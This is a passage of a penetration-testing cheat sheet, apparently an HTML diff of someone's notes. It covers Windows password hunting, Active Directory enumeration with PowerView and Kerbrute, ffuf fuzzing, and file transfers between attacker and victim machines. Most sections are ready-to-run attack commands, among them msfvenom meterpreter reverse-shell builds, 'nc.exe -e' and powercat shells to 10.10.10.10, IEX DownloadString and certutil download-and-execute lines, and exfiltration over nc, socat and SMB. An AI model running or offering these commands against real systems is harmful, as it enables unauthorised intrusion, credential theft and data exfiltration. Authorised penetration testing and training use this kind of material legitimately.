+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> C:\ <span class="literal">-Include</span> *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx <span class="operator">-File</span> <span class="literal">-Recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>search for potentially interesting files that contain PII</em></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">findstr /<span class="built_in">si</span> password *.txt</span><br><span class="line">findstr /<span class="built_in">si</span> password *.xml</span><br><span class="line">findstr /<span class="built_in">si</span> password *.ini</span><br><span class="line"></span><br><span class="line"><span class="comment">#Find all those strings in config files.</span></span><br><span class="line"><span class="built_in">dir</span> /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*` </span><br><span class="line"></span><br><span class="line"><span class="comment"># Find all passwords in all files.</span></span><br><span class="line">findstr /spin <span class="string">&quot;password&quot;</span> *.*</span><br><span class="line">findstr /spin <span class="string">&quot;password&quot;</span> *.*</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>search for clear text passwords</em></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#View Powershell History</span></span><br><span class="line"><span class="built_in">Get-History</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Save complete history and print path</span></span><br><span class="line">(<span class="built_in">Get-PSReadlineOption</span>).HistorySavePath</span><br><span class="line"></span><br><span class="line"><span class="comment">#Read content</span></span><br><span class="line"><span class="built_in">type</span> C:\Users\foo\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>Get Powershell history and display it</em></li>
+</ul>
+<br>
+
+<h3 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a><strong>Active Directory</strong></h3><h4 id="General-Domain-Information"><a href="#General-Domain-Information" class="headerlink" title="General Domain Information"></a>General Domain Information</h4><hr>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Retrieve FQDN</span></span><br><span class="line">[<span class="type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()</span><br><span class="line"></span><br><span class="line"><span class="comment"># get trusts</span></span><br><span class="line">nltest /domain_trusts ([<span class="type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()).GetAllTrustRelationships() <span class="built_in">get-adtrust</span> <span class="literal">-filter</span> *</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Usernames-and-Groups-1"><a href="#Usernames-and-Groups-1" class="headerlink" title="Usernames and Groups"></a>Usernames and Groups</h4><hr>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get domain users</span></span><br><span class="line">net user /domain</span><br><span class="line"></span><br><span class="line"><span class="comment">#retrieve ad properties of user foo</span></span><br><span class="line">net user foo /domain</span><br><span class="line"></span><br><span class="line"><span class="comment">#get info about specific user or object</span></span><br><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Identity</span> <span class="string">&quot;SQLService&quot;</span> <span class="literal">-Properties</span> * </span><br></pre></td></tr></table></figure>
+
+<h4 id="Enumeration-with-Powerview"><a href="#Enumeration-with-Powerview" class="headerlink" title="Enumeration with Powerview"></a>Enumeration with Powerview</h4><hr>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#load module</span></span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment">#Obtaining domain information</span></span><br><span class="line"><span class="built_in">Get-NetDomain</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Querying users in the domain</span></span><br><span class="line"><span class="built_in">Get-NetUser</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>query general information with Powerview</em></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get password last set &amp; last logon</span></span><br><span class="line"><span class="built_in">Get-NetUser</span> | <span class="built_in">select</span> cn,pwdlastset,lastlogon</span><br><span class="line"></span><br><span class="line"><span class="comment">#get membership of specific groups</span></span><br><span class="line"><span class="built_in">Get-NetGroup</span> <span class="string">&quot;Support Administrators&quot;</span> | <span class="built_in">select</span> member</span><br></pre></td></tr></table></figure>
+<ul>
+<li>*Retrieve more detailed domain info with Powerview</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Find-LocalAdminAccess</span><br><span class="line"><span class="comment"># scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain</span></span><br><span class="line"></span><br><span class="line">Get-NetSession -ComputerName files04 -Verbose <span class="comment">#Checking logged on users with Get-NetSession, adding verbosity gives more info.</span></span><br><span class="line">Get-NetUser -SPN | <span class="keyword">select</span> samaccountname,serviceprincipalname <span class="comment"># Listing SPN accounts in domain</span></span><br><span class="line"></span><br><span class="line">Get-DomainUser -PreauthNotRequired -verbose <span class="comment"># identifying AS-REP roastable accounts</span></span><br><span class="line"></span><br><span class="line">Get-NetUser -SPN | <span class="keyword">select</span> serviceprincipalname <span class="comment">#Kerberoastable accounts</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h4 id="Kerbrute"><a href="#Kerbrute" class="headerlink" title="Kerbrute"></a>Kerbrute</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerbrute userenum -d corp.com --dc</span><br><span class="line">172.16.5.5 /opt/jsmith-pass.txt </span><br><span class="line"><span class="comment">#Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don&#x27;t require Kerberos pre-authentication. Performed from a Linux-based host</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><strong>Linux</strong></h3><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h3><br>
+
+<h4 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a><strong>Fuzzing</strong></h4><p><a target="_blank" rel="noopener" href="https://github.com/tamimhasan404/FFUF-Tips-And-Tricks">FFUF 101</a></p>
+<p><img src="https://user-images.githubusercontent.com/66991901/106984127-2eeaf100-6791-11eb-8d98-da088f374a53.png" alt="Status Code for the Web"></p>
+<p><em>Status Code for the Web</em></p>
+<h4 id="Filtering"><a href="#Filtering" class="headerlink" title="Filtering"></a>Filtering</h4><hr>
+<p><strong>Option name: -ac</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ffuf -w /root/Desktop/wordlist.txt -u http://FUZZ.ab.com -ac</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>filter out unnecessary sites like 401,403</em></li>
+</ul>
+<br>
+
+<p><strong>Option name: -mc</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ffuf -w /root/Desktop/wordlist.txt -u http://FUZZ.ab.com -mc 200,301</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>Match HTTP status codes, or “all” for everything (default: 200,204,301,302,307,401,403)</em></li>
+</ul>
+<br>
+
+<p><strong>VHOST Discovery</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Virtual host discovery (without DNS records)</span></span><br><span class="line">ffuf -w /path/to/vhost/wordlist -u https://target -H <span class="string">&quot;Host: FUZZ&quot;</span> -fs 4242</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>discover vhosts</em></li>
+</ul>
+<br>
+
+<p><strong>Option name: -recursion</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ffuf -w /root/Desktop/SecLists-master/Discovery/Web-Content/raft-large-directories.txt -u https://xyz.com/FUZZ -recursion</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>fuzz with recursion</em></li>
+</ul>
+<br>
+
+<h4 id="Extension"><a href="#Extension" class="headerlink" title="Extension"></a>Extension</h4><hr>
+<p>Option name: -e</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ffuf -w /root/Desktop/SecLists-master/Discovery/Web-Content/raft-large-directories.txt -u https://xyz.com/FUZZ -e .html,.php,.txt,.pdf</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><em>Sometimes it gives you valuable information. Which is maybe goldmine on your penetration testing&#x2F;bug hunting.For this, you have to choose extension base on your target</em></li>
+</ul>
+<br>
+
+
+
+
+
+
+
+
+
+
+
+<br>
+<br>
+
+
+
+<h1 id="Shells"><a href="#Shells" class="headerlink" title="Shells"></a>Shells</h1><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="Revshells"><a href="#Revshells" class="headerlink" title="Revshells"></a>Revshells</h4><hr>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.revshells.com/</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>great website that does most of the work for you</em></li>
+</ul>
+<br>
+
+<h4 id="Catch-the-shell-using-NC"><a href="#Catch-the-shell-using-NC" class="headerlink" title="Catch the shell using NC"></a>Catch the shell using NC</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9999</span><br><span class="line"><span class="comment">#listen on Port 9999</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>start a listener on Port 9999</em></li>
+<li>*prefer to use stealthier ports, sometimes a firewall is in between *</li>
+</ul>
+<br>
+
+<h4 id="Upload-nc-exe-to-victim"><a href="#Upload-nc-exe-to-victim" class="headerlink" title="Upload nc.exe to victim"></a>Upload nc.exe to victim</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/share/windows-resources/binaries/nc.exe .</span><br><span class="line"><span class="comment">#copy to local directory</span></span><br><span class="line"></span><br><span class="line">python3 -m http.server 8000</span><br><span class="line"><span class="comment">#serve the file </span></span><br><span class="line"></span><br><span class="line">powershell.exe -ep bypass </span><br><span class="line"><span class="comment">#bypass script-block</span></span><br><span class="line"></span><br><span class="line">IwR -Uri http://10.10.10.10:8000/nc.exe -Outfile nc.exe</span><br><span class="line"><span class="comment">#on victim machine, download nc.exe</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>quick way to upload nc.exe to victim machine</em></li>
+</ul>
+<br>
+
+<h4 id="MSFVenom"><a href="#MSFVenom" class="headerlink" title="MSFVenom"></a>MSFVenom</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=9999 -f exe -o revshell.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>staged x64 reverse-shell using MSFVenom</em></li>
+</ul>
+<br>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=9999 -f exe -o revshell.exe</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>stageless x64 reverse-shell using MSFVenom</em></li>
+</ul>
+<br>
+
+<h4 id="Nc-and-Ncat"><a href="#Nc-and-Ncat" class="headerlink" title="Nc and Ncat"></a>Nc and Ncat</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc.exe 10.10.10.10 9999 -e sh</span><br><span class="line"><span class="comment">#spawn the shell on victim machine</span></span><br><span class="line"></span><br><span class="line">ncat.exe 10.10.10.10 9999 -e sh</span><br><span class="line"><span class="comment">#spawn the shell on victim machine</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>spawn revshell on victim machine</em></li>
+</ul>
+<br>
+
+<h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h4 id="Revshells-1"><a href="#Revshells-1" class="headerlink" title="Revshells"></a>Revshells</h4><hr>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.revshells.com/</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>great website that does most of the work for you</em></li>
+</ul>
+<br>
+
+<h4 id="Upgrade-shell"><a href="#Upgrade-shell" class="headerlink" title="Upgrade shell"></a>Upgrade shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br><span class="line">CTRL + Z         <span class="comment">#backgrounds netcat session</span></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span></span><br><span class="line"><span class="built_in">fg</span>               <span class="comment">#brings netcat session back to the foreground</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h4 id="Catch-the-shell-using-NC-1"><a href="#Catch-the-shell-using-NC-1" class="headerlink" title="Catch the shell using NC"></a>Catch the shell using NC</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9999</span><br><span class="line"><span class="comment">#listen on Port 9999</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>start a listener on Port 9999</em></li>
+<li><em>prefer to use stealthier ports, sometimes a firewall will block you</em></li>
+</ul>
+<br>
+
+<h1 id="File-Transfers"><a href="#File-Transfers" class="headerlink" title="File Transfers"></a>File Transfers</h1><h3 id="General"><a href="#General" class="headerlink" title="General"></a><strong>General</strong></h3><br>
+
+<h4 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</span><br><span class="line"></span><br><span class="line">curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>download LinEnum.sh and execute and save it to &#x2F;tmp</em></li>
+</ul>
+<h4 id="Nc-and-NCAT"><a href="#Nc-and-NCAT" class="headerlink" title="Nc and NCAT"></a>Nc and NCAT</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 4444 &gt; incoming.exe</span><br><span class="line">nc -nv 10.11.0.22 4444 &lt; /usr/share/windows-resources/binaries/wget.exe</span><br><span class="line">nc -q 0 10.11.0.22 4444 &lt; /usr/share/windows-resources/binaries/wget.exe</span><br><span class="line"></span><br><span class="line"><span class="comment">## Kali</span></span><br><span class="line">ncat --send-only 192.168.45.226 8000 &lt; wget.exe</span><br><span class="line"><span class="comment">## Victim</span></span><br><span class="line">ncat -l -p 8000 --recv-only &gt; thefile</span><br><span class="line"></span><br><span class="line"><span class="comment">## Receive the file with BASH only</span></span><br><span class="line"><span class="built_in">cat</span> &lt; /dev/tcp/192.168.45.226/443 &gt; wget.exe</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>transfer files using nc and ncat</em></li>
+</ul>
+<h4 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> socat TCP4-LISTEN:443,fork file:secret_passwords.txt</span><br><span class="line">socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create</span><br><span class="line"><span class="built_in">type</span> received_secret_passwords.txt</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>transfer files using socat</em></li>
+</ul>
+<h4 id="Uploading-files"><a href="#Uploading-files" class="headerlink" title="Uploading files"></a>Uploading files</h4><hr>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 <span class="literal">-m</span> http.server <span class="number">8000</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">8000</span> (http://<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">8000</span>/) ...</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>python3 simple-httpserver</em></li>
+</ul>
+<br>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby <span class="literal">-run</span> <span class="literal">-e</span> httpd . <span class="literal">-p</span> <span class="number">8000</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>ruby simple webserver to serve files</em></li>
+</ul>
+<br>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php <span class="literal">-S</span> localhost:<span class="number">8080</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>php simple webserver to serve files in current directory</em></li>
+</ul>
+<h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a><strong>Windows</strong></h3><h4 id="Using-wget"><a href="#Using-wget" class="headerlink" title="Using wget"></a>Using wget</h4><hr>
+<p>Download and Execute</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">wget</span> https://<span class="number">10.10</span>.<span class="number">10.10</span>:<span class="number">8000</span>/PowerView.ps1 | <span class="built_in">iex</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">curl</span> https://<span class="number">10.10</span>.<span class="number">10.10</span>:<span class="number">8000</span>/PowerView.ps1 | <span class="built_in">iex</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><hr>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">wget</span> <span class="number">10.10</span>.<span class="number">10.10</span>/remoteShell.exe <span class="literal">-outfile</span> stealthyshell.exe </span><br><span class="line"></span><br><span class="line"><span class="built_in">IwR</span> <span class="literal">-Uri</span> http://<span class="number">10.10</span>.<span class="number">10.10</span>:<span class="number">8000</span>/file.exe <span class="literal">-Outfile</span> file.exe | <span class="built_in">iex</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> https://<span class="number">10.10</span>.<span class="number">10.10</span>:<span class="number">8000</span>/PowerView.ps1 | <span class="built_in">iex</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">IEX</span>(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://10.10.10.10:8000/rev.ps1&quot;</span>) | powershell <span class="literal">-noprofile</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>download reverse shell and execute it</em></li>
+</ul>
+<br>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-c</span> <span class="string">&quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://10.10.10.10:8000/PowerCat.ps1&#x27;);</span></span><br><span class="line"><span class="string">powercat -c 10.10.10.10 -p 4444 -e powershell&quot;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>Download powercat and open shell</em></li>
+</ul>
+<h4 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h4><hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -f http://10.10.10.10:Port/shell.exe bad.exe</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="WinRM-Powershell-Remote"><a href="#WinRM-Powershell-Remote" class="headerlink" title="WinRM &#x2F; Powershell Remote"></a>WinRM &#x2F; Powershell Remote</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Session</span> = New-PSSession -ComputerName DATABASE01</span><br><span class="line"></span><br><span class="line"><span class="comment">#to our target</span></span><br><span class="line">Copy-Item -Path C:\samplefile.txt -ToSession <span class="variable">$Session</span> -Destination C:\Users\Administrator\Desktop\</span><br><span class="line"></span><br><span class="line"><span class="comment">#to our client</span></span><br><span class="line">Copy-Item -Path <span class="string">&quot;C:\Users\Administrator\Desktop\DATABASE.txt&quot;</span> -Destination C:\ -FromSession <span class="variable">$Session</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Via-SMB"><a href="#Via-SMB" class="headerlink" title="Via SMB"></a>Via SMB</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> impacket-smbserver [SHARE_NAME] [PATH_TO_SHARE]</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>With <code>impacket-smbserver</code>:</em><br>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> impacket-smbserver share .</span><br></pre></td></tr></table></figure></li>
+<li><em>E.g. to server current directory:</em><br>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\[IP]\share\file</span><br></pre></td></tr></table></figure></li>
+<li><em>To copy from the share to a Windows client:</em><br>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy [FILE] \\[IP]\share</span><br></pre></td></tr></table></figure></li>
+<li><em>To copy to the share (i.e. exfiltrate a file):</em></li>
+</ul>
+<h4 id="Powershell-Simple-HTTP-Server-File-Download"><a href="#Powershell-Simple-HTTP-Server-File-Download" class="headerlink" title="Powershell Simple HTTP-Server File-Download"></a>Powershell Simple HTTP-Server <em>File-Download</em></h4><hr>
+<p><a target="_blank" rel="noopener" href="https://github.com/secure-77/powershell-http-server">https://github.com/secure-77/powershell-http-server</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># server on port 8000</span></span><br><span class="line"> ./webserver.ps1</span><br><span class="line"><span class="built_in">Start-Webserver</span> <span class="string">&quot;http://+:8080/&quot;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h4 id="Unzip-Files"><a href="#Unzip-Files" class="headerlink" title="Unzip Files"></a>Unzip Files</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#unzip</span></span><br><span class="line">Expand-Archive C:\Windows\Public\Desktop\temp.zip -DestinationPath C:\Windows\Public\Desktop\temp</span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br>
+<br>
+
+
+<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><h2 id="Windows-PrivEsc"><a href="#Windows-PrivEsc" class="headerlink" title="Windows PrivEsc"></a><strong>Windows PrivEsc</strong></h2><hr>
+<h3 id="Manual-Privilege-Escalation"><a href="#Manual-Privilege-Escalation" class="headerlink" title="Manual Privilege Escalation"></a><strong>Manual Privilege Escalation</strong></h3><hr>
+<br>
+
+<h4 id="Check-Permissions"><a href="#Check-Permissions" class="headerlink" title="Check Permissions"></a><strong>Check Permissions</strong></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#list everything</span></span><br><span class="line">whoami /all</span><br><span class="line"></span><br><span class="line"><span class="comment">#only show privileges</span></span><br><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>SeImpersonatePrivilege? &#x3D;&gt; System through Potato&#x2F;PrintSpoofer</em></li>
+<li><em>Remote Desktop User? &#x3D;&gt; RDP access should work, try to enumerate via GUI or use to Pivot</em></li>
+</ul>
+<br>
+
+<h4 id="Check-File-Permissions"><a href="#Check-File-Permissions" class="headerlink" title="Check File Permissions"></a><strong>Check File Permissions</strong></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Software that stands out</span></span><br><span class="line">icacls <span class="string">&quot;C:\xampp\&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>look for Software where BuiltInUsers  have e.g. RX rights and potentially leverage to add a higher privileged user</em></li>
+</ul>
+<br>
+
+<h4 id="Service-Binary-Hijacking"><a href="#Service-Binary-Hijacking" class="headerlink" title="Service Binary Hijacking"></a><strong>Service Binary Hijacking</strong></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get running services</span></span><br><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> win32_service | <span class="built_in">Select</span> Name,State,PathName | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.State <span class="operator">-like</span> <span class="string">&#x27;Running&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#get services</span></span><br><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> win32_service | <span class="built_in">Select</span> Name, StartMode</span><br><span class="line"></span><br><span class="line"><span class="comment">#Check mysql service </span></span><br><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> win32_service | <span class="built_in">Select</span> Name, StartMode | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.Name <span class="operator">-like</span> <span class="string">&#x27;mysql&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>check for start up type of a service</em></li>
+</ul>
+<br>
+
